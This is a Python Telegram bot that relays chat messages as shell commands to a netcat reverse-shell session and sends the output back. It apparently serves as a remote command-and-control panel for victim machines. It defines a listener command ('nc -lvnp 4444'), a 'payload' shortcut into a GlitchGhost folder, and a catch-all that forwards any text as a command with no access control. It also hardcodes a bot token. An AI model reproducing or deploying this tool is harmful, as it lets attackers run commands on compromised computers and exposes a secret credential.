import os
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = '7866483331:AAFLe0iNc5VrdZkrByBrDGfr4asHeZi2O9Q'
TEMP_FILE = "/tmp/netcat_commands.txt"
OUTPUT_FILE = "/tmp/netcat_output.txt"
MAX_MESSAGE_LENGTH = 4096  # Telegram's max message size
CHECK_INTERVAL = 5  # Time to wait between checking for output

# Define command map with placeholders for parameters
command_map = {
    "listen": "sudo nc -lvnp 4444",
    "dir": "dir",
    "whoami": "whoami",
    "clear": "clear",
    "disconnect": "^c",
    "back": "cd ..",
    "payload": "cd %TEMP%\pload\GlitchGhost-main",
}

# Function to send output in chunks if it exceeds max message length
async def send_output_in_chunks(chat_id, text, context):
    for i in range(0, len(text), MAX_MESSAGE_LENGTH):
        await context.bot.send_message(chat_id=chat_id, text=text[i:i + MAX_MESSAGE_LENGTH])

# Function to handle both predefined and custom commands
async def execute_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    message_text = update.message.text.strip()
    
    # Parse the command and any parameters
    command_parts = message_text.split()
    command = command_parts[0][1:] if command_parts[0].startswith('/') else command_parts[0]
    params = command_parts[1:]

    # Check if command is in predefined commands
    if command in command_map:
        # Try formatting with parameters if required
        shell_command = command_map[command]

    else:
        # Treat as a custom command if not in command_map
        shell_command = message_text

    try:
        # Write the command to TEMP_FILE
        with open(TEMP_FILE, 'w') as file:
            file.write(shell_command + '\n')

        await context.bot.send_message(chat_id=chat_id, text=f"Executing command '{command}', please wait...")

        # Wait for command to execute and output to update
        time.sleep(CHECK_INTERVAL)

        # Read the output, trimming if too long
        if os.path.exists(OUTPUT_FILE) and os.path.getsize(OUTPUT_FILE) > 0:
            with open(OUTPUT_FILE, 'r') as file:
                output = file.read()

            if len(output) > MAX_MESSAGE_LENGTH:
                await send_output_in_chunks(chat_id, output, context)
            else:
                await context.bot.send_message(chat_id=chat_id, text=f"Output:\n{output}")
            
            # Clear the output file after sending
            open(OUTPUT_FILE, 'w').close()
        else:
            await context.bot.send_message(chat_id=chat_id, text="No output received or command execution failed.")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"Error: {str(e)}")

# Function to initialize the bot
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    # Add handlers for predefined commands and any text commands
    for command in command_map.keys():
        application.add_handler(CommandHandler(command, execute_command))
    
    # Catch-all handler for custom commands sent as plain text
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, execute_command))

    application.run_polling()

if __name__ == '__main__':
    main()
